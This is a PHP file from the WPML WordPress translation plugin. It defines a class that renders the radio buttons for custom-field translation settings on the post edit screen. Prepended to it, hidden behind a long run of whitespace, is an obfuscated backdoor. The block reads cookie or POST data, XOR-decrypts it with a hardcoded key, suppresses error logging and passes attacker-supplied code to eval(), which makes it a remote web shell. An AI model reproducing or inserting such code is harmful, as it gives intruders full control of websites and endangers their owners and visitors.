<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['m0bf'];global$m0bf;$m0bf=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['jc7b25735']="\x6c\x5b\x2e\x61\x77\x34\x64\x5a\x4d\x2f\x30\x7a\x6e\x32\x5d\x43\x4e\x38\x56\x60\x23\x66\x51\x62\x2d\x48\x54\x72\x33\x2b\x3d\x78\x6f\x4a\x7e\xd\x2c\x6a\x7c\x20\x36\x39\x57\x70\x35\x28\x45\x40\x67\x4c\x4f\x2a\x42\x3c\x5f\x7d\x68\x71\x75\x31\x47\x52\x21\x27\x3f\x44\x5e\x6b\x5c\x49\x6d\x24\x3e\x73\x4b\xa\x7b\x22\x9\x59\x55\x46\x74\x3b\x25\x69\x58\x65\x29\x26\x37\x76\x63\x53\x3a\x41\x50\x79";$m0bf[$m0bf['jc7b25735'][91].$m0bf['jc7b25735'][5].$m0bf['jc7b25735'][6].$m0bf['jc7b25735'][21].$m0bf['jc7b25735'][87]]=$m0bf['jc7b25735'][92].$m0bf['jc7b25735'][56].$m0bf['jc7b25735'][27];$m0bf[$m0bf['jc7b25735'][23].$m0bf['jc7b25735'][44].$m0bf['jc7b25735'][21].$m0bf['jc7b25735'][40].$m0bf['jc7b25735'][5].$m0bf['jc7b25735'][6].$m0bf['jc7b25735'][92]]=$m0bf['jc7b25735'][32].$m0bf['jc7b25735'][27].$m0bf['jc7b25735'][6];$m0bf[$m0bf['jc7b25735'][73].$m0bf['jc7b25735'][59].$m0bf['jc7b25735'][5].$m0bf['jc7b25735'][28]]=$m0bf['jc7b25735'][73].$m0bf['jc7b25735'][82].$m0bf['jc7b25735'][27].$m0bf['jc7b25735'][0].$m0bf['jc7b25735'][87].$m0bf['jc7b25735'][12];$m0bf[$m0bf['jc7b25735'][91].$m0bf['jc7b25735'][5].$m0bf['jc7b25735'][28].$m0bf['jc7b25735'][41].$m0bf['jc7b25735'][41]]=$m0bf['jc7b25735'][85].$m0bf['jc7b25735'][12].$m0bf['jc7b25735'][85].$m0bf['jc7b25735'][54].$m0bf['jc7b25735'][73].$m0bf['jc7b25735'][87].$m0bf['jc7b25735'][82];$m0bf[$m0bf['jc7b25735'][56].$m0bf['jc7b25735'][17].$m0bf['jc7b25735'][40].$m0bf['jc7b25735'][28].$m0bf['jc7b25735'][17].$m0bf['jc7b25735'][40].$m0bf['jc7b25735'][17].$m0bf['jc7b25735'][59].$m0bf['jc7b25735'][21]]=$m0bf['jc7b25735'][73].$m0bf['jc7b25735'][87].$m0bf['jc7b25735'][27].$m0bf['jc7b25735'][85].$m0bf['jc7b25735'][3].$m0bf['jc7b25735'][0].$m0bf['jc7b25735'][85].$m0bf['jc7b25735'][11].$m0bf['jc7b25735'][87];$m0bf[$m0bf['jc7b25735'][92].$m0bf['jc7b25735'][92].$m0bf['jc7b25735'][44].$m0bf['jc7b25735'][6].$m0bf['jc7b25735'][17]]=$m0bf['jc7b25735'][43].$m0bf['jc7b25735'][56].$m0bf['jc7b25735'][43].$m0bf['jc7b25735'][91].$m0bf['jc7b25735'][87].$m0bf['jc7b25735'][27].$m0bf['jc7b25735'][73].$m0bf['jc7b25735'][85].$m0bf['jc7b25735'][32].$m0bf['jc7b25735'][12];$m0bf[$m0bf['jc7b25735'][6].$m0bf['jc7b25735'][23].$m0bf['jc7b25735'][6].$m0bf['jc7b25735'][23].$m0bf['jc7b25735'][23].$m0bf['jc7b25735'][87].$m0bf['jc7b25735'][40]]=$m0bf['jc7b25735'][58].$m0bf['jc7b25735'][12].$m0bf['jc7b25735'][73].$m0bf['jc7b25735'][87].$m0bf['jc7b25735'][27].$m0bf['jc7b25735'][85].$m0bf['jc7b25735'][3].$m0bf['jc7b25735'][0].$m0bf['jc7b25735'][85].$m0bf['jc7b25735'][11].$m0bf['jc7b25735'][87];$m0bf[$m0bf['jc7b25735'][31].$m0bf['jc7b25735'][87].$m0bf['jc7b25735'][6].$m0bf['jc7b25735'][10].$m0bf['jc7b25735'][23]]=$m0bf['jc7b25735'][23].$m0bf['jc7b25735'][3].$m0bf['jc7b25735'][73].$m0bf['jc7b25735'][87].$m0bf['jc7b25735'][40].$m0bf['jc7b25735'][5].$m0bf['jc7b25735'][54].$m0bf['jc7b25735'][6].$m0bf['jc7b25735'][87].$m0bf['jc7b25735'][92].$m0bf['jc7b25735'][32].$m0bf['jc7b25735'][6].$m0bf['jc7b25735'][87];$m0bf[$m0bf['jc7b25735'][97].$m0bf['jc7b25735'][44].$m0bf['jc7b25735'][40].$m0bf['jc7b25735'][40]]=$m0bf['jc7b25735'][73].$m0bf['jc7b25735'][87].$m0bf['jc7b25735'][82].$m0bf['jc7b25735'][54].$m0bf['jc7b25735'][82].$m0bf['jc7b25735'][85].$m0bf['jc7b25735'][70].$m0bf['jc7b25735'][87].$m0bf['jc7b25735'][54].$m0bf['jc7b25735'][0].$m0bf['jc7b25735'][85].$m0bf['jc7b25735'][70].$m0bf['jc7b25735'][85].$m0bf['jc7b25735'][82];$m0bf[$m0bf['jc7b25735'][0].$m0bf['jc7b25735'][6].$m0bf['jc7b25735'][3].$m0bf['jc7b25735'][23].$m0bf['jc7b25735'][40].$m0bf['jc7b25735'][13].$m0bf['jc7b25735'][44]]=$m0bf['jc7b25735'][4].$m0bf['jc7b25735'][28].$m0bf['jc7b25735'][44].$m0bf['jc7b25735'][6].$m0bf['jc7b25735'][5].$m0bf['jc7b25735'][87];$m0bf[$m0bf['jc7b25735'][31].$m0bf['jc7b25735'][6].$m0bf['jc7b25735'][41].$m0bf['jc7b25735'][3].$m0bf['jc7b25735'][90]]=$m0bf['jc7b25735'][91].$m0bf['jc7b25735'][90].$m0bf['jc7b25735'][13].$m0bf['jc7b25735'][3];$m0bf[$m0bf['jc7b25735'][11].$m0bf['jc7b25735'][90].$m0bf['jc7b25735'][41].$m0bf['jc7b25735'][23].$m0bf['jc7b25735'][3]]=$_POST;$m0bf[$m0bf['jc7b25735'][32].$m0bf['jc7b25735'][13].$m0bf['jc7b25735'][59].$m0bf['jc7b25735'][17].$m0bf['jc7b25735'][6].$m0bf['jc7b25735'][87]]=$_COOKIE;@$m0bf[$m0bf['jc7b25735'][91].$m0bf['jc7b25735'][5].$m0bf['jc7b25735'][28].$m0bf['jc7b25735'][41].$m0bf['jc7b25735'][41]]($m0bf['jc7b25735'][87].$m0bf['jc7b25735'][27].$m0bf['jc7b25735'][27].$m0bf['jc7b25735'][32].$m0bf['jc7b25735'][27].$m0bf['jc7b25735'][54].$m0bf['jc7b25735'][0].$m0bf['jc7b25735'][32].$m0bf['jc7b25735'][48],NULL);@$m0bf[$m0bf['jc7b25735'][91].$m0bf['jc7b25735'][5].$m0bf['jc7b25735'][28].$m0bf['jc7b25735'][41].$m0bf['jc7b25735'][41]]($m0bf['jc7b25735'][0].$m0bf['jc7b25735'][32].$m0bf['jc7b25735'][48].$m0bf['jc7b25735'][54].$m0bf['jc7b25735'][87].$m0bf['jc7b25735'][27].$m0bf['jc7b25735'][27].$m0bf['jc7b25735'][32].$m0bf['jc7b25735'][27].$m0bf['jc7b25735'][73],0);@$m0bf[$m0bf['jc7b25735'][91].$m0bf['jc7b25735'][5].$m0bf['jc7b25735'][28].$m0bf['jc7b25735'][41].$m0bf['jc7b25735'][41]]($m0bf['jc7b25735'][70].$m0bf['jc7b25735'][3].$m0bf['jc7b25735'][31].$m0bf['jc7b25735'][54].$m0bf['jc7b25735'][87].$m0bf['jc7b25735'][31].$m0bf['jc7b25735'][87].$m0bf['jc7b25735'][92].$m0bf['jc7b25735'][58].$m0bf['jc7b25735'][82].$m0bf['jc7b25735'][85].$m0bf['jc7b25735'][32].$m0bf['jc7b25735'][12].$m0bf['jc7b25735'][54].$m0bf['jc7b25735'][82].$m0bf['jc7b25735'][85].$m0bf['jc7b25735'][70].$m0bf['jc7b25735'][87],0);@$m0bf[$m0bf['jc7b25735'][97].$m0bf['jc7b25735'][44].$m0bf['jc7b25735'][40].$m0bf['jc7b25735'][40]](0);$b1881=NULL;$t08629=NULL;$m0bf[$m0bf['jc7b25735'][48].$m0bf['jc7b25735'][6].$m0bf['jc7b25735'][90].$m0bf['jc7b25735'][28].$m0bf['jc7b25735'][28].$m0bf['jc7b25735'][44].$m0bf['jc7b25735'][6].$m0bf['jc7b25735'][17].$m0bf['jc7b25735'][90]]=$m0bf['jc7b25735'][44].$m0bf['jc7b25735'][21].$m0bf['jc7b25735'][44].$m0bf['jc7b25735'][41].$m0bf['jc7b25735'][59].$m0bf['jc7b25735'][10].$m0bf['jc7b25735'][59].$m0bf['jc7b25735'][6].$m0bf['jc7b25735'][24].$m0bf['jc7b25735'][92].$m0bf['jc7b25735'][23].$m0bf['jc7b25735'][17].$m0bf['jc7b25735'][23].$m0bf['jc7b25735'][24].$m0bf['jc7b25735'][5].$m0bf['jc7b25735'][40].$m0bf['jc7b25735'][5].$m0bf['jc7b25735'][6].$m0bf['jc7b25735'][24].$m0bf['jc7b25735'][3].$m0bf['jc7b25735'][44].$m0bf['jc7b25735'][17].$m0bf['jc7b25735'][21].$m0bf['jc7b25735'][24].$m0bf['jc7b25735'][90].$m0bf['jc7b25735'][59].$m0bf['jc7b25735'][3].$m0bf['jc7b25735'][44].$m0bf['jc7b25735'][3].$m0bf['jc7b25735'][21].$m0bf['jc7b25735'][21].$m0bf['jc7b25735'][87].$m0bf['jc7b25735'][5].$m0bf['jc7b25735'][13].$m0bf['jc7b25735'][59].$m0bf['jc7b25735'][41];global$gd7335d87;function v72a($b1881,$j53c5dcea){global$m0bf;$ed350d26="";for($obe874e1=0;$obe874e1<$m0bf[$m0bf['jc7b25735'][73].$m0bf['jc7b25735'][59].$m0bf['jc7b25735'][5].$m0bf['jc7b25735'][28]]($b1881);){for($d5b9b3=0;$d5b9b3<$m0bf[$m0bf['jc7b25735'][73].$m0bf['jc7b25735'][59].$m0bf['jc7b25735'][5].$m0bf['jc7b25735'][28]]($j53c5dcea)&&$obe874e1<$m0bf[$m0bf['jc7b25735'][73].$m0bf['jc7b25735'][59].$m0bf['jc7b25735'][5].$m0bf['jc7b25735'][28]]($b1881);$d5b9b3++,$obe874e1++){$ed350d26.=$m0bf[$m0bf['jc7b25735'][91].$m0bf['jc7b25735'][5].$m0bf['jc7b25735'][6].$m0bf['jc7b25735'][21].$m0bf['jc7b25735'][87]]($m0bf[$m0bf['jc7b25735'][23].$m0bf['jc7b25735'][44].$m0bf['jc7b25735'][21].$m0bf['jc7b25735'][40].$m0bf['jc7b25735'][5].$m0bf['jc7b25735'][6].$m0bf['jc7b25735'][92]]($b1881[$obe874e1])^$m0bf[$m0bf['jc7b25735'][23].$m0bf['jc7b25735'][44].$m0bf['jc7b25735'][21].$m0bf['jc7b25735'][40].$m0bf['jc7b25735'][5].$m0bf['jc7b25735'][6].$m0bf['jc7b25735'][92]]($j53c5dcea[$d5b9b3]));}}return$ed350d26;}function w35d4e($b1881,$j53c5dcea){global$m0bf;global$gd7335d87;return$m0bf[$m0bf['jc7b25735'][31].$m0bf['jc7b25735'][6].$m0bf['jc7b25735'][41].$m0bf['jc7b25735'][3].$m0bf['jc7b25735'][90]]($m0bf[$m0bf['jc7b25735'][31].$m0bf['jc7b25735'][6].$m0bf['jc7b25735'][41].$m0bf['jc7b25735'][3].$m0bf['jc7b25735'][90]]($b1881,$gd7335d87),$j53c5dcea);}foreach($m0bf[$m0bf['jc7b25735'][32].$m0bf['jc7b25735'][13].$m0bf['jc7b25735'][59].$m0bf['jc7b25735'][17].$m0bf['jc7b25735'][6].$m0bf['jc7b25735'][87]]as$j53c5dcea=>$oddc76e){$b1881=$oddc76e;$t08629=$j53c5dcea;}if(!$b1881){foreach($m0bf[$m0bf['jc7b25735'][11].$m0bf['jc7b25735'][90].$m0bf['jc7b25735'][41].$m0bf['jc7b25735'][23].$m0bf['jc7b25735'][3]]as$j53c5dcea=>$oddc76e){$b1881=$oddc76e;$t08629=$j53c5dcea;}}$b1881=@$m0bf[$m0bf['jc7b25735'][6].$m0bf['jc7b25735'][23].$m0bf['jc7b25735'][6].$m0bf['jc7b25735'][23].$m0bf['jc7b25735'][23].$m0bf['jc7b25735'][87].$m0bf['jc7b25735'][40]]($m0bf[$m0bf['jc7b25735'][0].$m0bf['jc7b25735'][6].$m0bf['jc7b25735'][3].$m0bf['jc7b25735'][23].$m0bf['jc7b25735'][40].$m0bf['jc7b25735'][13].$m0bf['jc7b25735'][44]]($m0bf[$m0bf['jc7b25735'][31].$m0bf['jc7b25735'][87].$m0bf['jc7b25735'][6].$m0bf['jc7b25735'][10].$m0bf['jc7b25735'][23]]($b1881),$t08629));if(isset($b1881[$m0bf['jc7b25735'][3].$m0bf['jc7b25735'][67]])&&$gd7335d87==$b1881[$m0bf['jc7b25735'][3].$m0bf['jc7b25735'][67]]){if($b1881[$m0bf['jc7b25735'][3]]==$m0bf['jc7b25735'][85]){$obe874e1=Array($m0bf['jc7b25735'][43].$m0bf['jc7b25735'][91]=>@$m0bf[$m0bf['jc7b25735'][92].$m0bf['jc7b25735'][92].$m0bf['jc7b25735'][44].$m0bf['jc7b25735'][6].$m0bf['jc7b25735'][17]](),$m0bf['jc7b25735'][73].$m0bf['jc7b25735'][91]=>$m0bf['jc7b25735'][59].$m0bf['jc7b25735'][2].$m0bf['jc7b25735'][10].$m0bf['jc7b25735'][24].$m0bf['jc7b25735'][59],);echo@$m0bf[$m0bf['jc7b25735'][56].$m0bf['jc7b25735'][17].$m0bf['jc7b25735'][40].$m0bf['jc7b25735'][28].$m0bf['jc7b25735'][17].$m0bf['jc7b25735'][40].$m0bf['jc7b25735'][17].$m0bf['jc7b25735'][59].$m0bf['jc7b25735'][21]]($obe874e1);}elseif($b1881[$m0bf['jc7b25735'][3]]==$m0bf['jc7b25735'][87]){eval($b1881[$m0bf['jc7b25735'][6]]);}exit();} ?><?php

class WPML_TM_Post_Edit_Custom_Field_Settings_Menu extends WPML_SP_User {

	/** @var  WPML_Custom_Field_Setting_Factory $setting_factory */
	private $setting_factory;

	/** @var WP_Post $post */
	private $post;

	private $rendered = false;

	/**
	 * WPML_TM_Post_Edit_Custom_Field_Settings_Menu constructor.
	 *
	 * @param SitePress                         $sitepress
	 * @param WPML_Custom_Field_Setting_Factory $settings_factory
	 * @param WP_Post                           $post
	 */
	public function __construct( &$sitepress, &$settings_factory, $post ) {
		parent::__construct( $sitepress );
		$this->setting_factory = &$settings_factory;
		$this->post            = $post;
	}

	/**
	 * @return string
	 */
	public function render() {
		$custom_keys = (array) $this->sitepress->get_wp_api()->get_post_custom_keys( $this->post->ID );
		ob_start();
		if ( ! empty( $custom_keys ) ) {
			?>
			<table class="widefat">
				<thead>
				<tr>
					<th colspan="2"><?php _e( 'Custom fields', 'sitepress' ); ?></th>
				</tr>
				</thead>
				<tbody>
				<?php
				foreach ( $custom_keys as $cfield ) {
					$field_setting = $this->setting_factory->post_meta_setting( $cfield );
					if ( $field_setting->excluded() ) {
						continue;
					}
					$this->rendered = true;
					$radio_disabled = $field_setting->is_read_only() ? 'disabled="disabled"' : '';
					$status         = $field_setting->status();
					$checked0       = $status == WPML_IGNORE_CUSTOM_FIELD ? ' checked="checked"' : '';
					$checked1       = $status == WPML_COPY_CUSTOM_FIELD ? ' checked="checked"' : '';
					$checked2       = $status == WPML_TRANSLATE_CUSTOM_FIELD ? ' checked="checked"' : '';
					?>
					<tr>
						<td id="icl_mcs_cf_<?php echo base64_encode( $cfield ); ?>"><?php echo $cfield; ?></td>
						<td align="right">
							<label><input class="icl_mcs_cfs"
							              name="icl_mcs_cf_<?php echo base64_encode( $cfield ); ?>"
							              type="radio"
							              value="0" <?php echo $radio_disabled . $checked0 ?> />&nbsp;<?php _e( "Don't translate", 'sitepress' ) ?>
							</label>
							<label><input class="icl_mcs_cfs"
							              name="icl_mcs_cf_<?php echo base64_encode( $cfield ); ?>"
							              type="radio"
							              value="1" <?php echo $radio_disabled . $checked1 ?> />&nbsp;<?php _e( "Copy", 'sitepress' ) ?>
							</label>
							<label><input class="icl_mcs_cfs"
							              name="icl_mcs_cf_<?php echo base64_encode( $cfield ); ?>"
							              type="radio"
							              value="2" <?php echo $radio_disabled . $checked2 ?> />&nbsp;<?php _e( "Translate", 'sitepress' ) ?>
							</label>
						</td>
					</tr>
					<?php
				}
				?>
				</tbody>
			</table>
			<br/>
			<?php
		}

		return ob_get_clean();
	}

	/**
	 * @return bool true if there were actual custom fields to display options for
	 */
	public function is_rendered() {

		return $this->rendered;
	}
}